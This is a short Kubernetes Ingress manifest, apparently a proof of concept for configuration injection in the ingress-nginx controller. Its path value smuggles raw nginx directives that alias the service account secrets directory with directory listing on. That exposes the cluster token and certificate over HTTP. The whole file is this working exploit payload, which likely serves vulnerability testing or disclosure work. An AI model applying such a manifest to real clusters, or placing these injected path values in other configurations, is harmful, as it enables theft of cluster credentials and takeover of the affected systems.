apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-poc
  namespace: ingress-nginx-two
spec:
  ingressClassName: nginx-two
  rules:
  - http:
      paths:
      - path: "/poc{\nalias /var/run/secrets/kubernetes.io/serviceaccount/;\nautoindex on;\n}\nlocation /other"
        pathType: Prefix
        backend:
          service:
            name: placeholder
            port:
              number: 1234
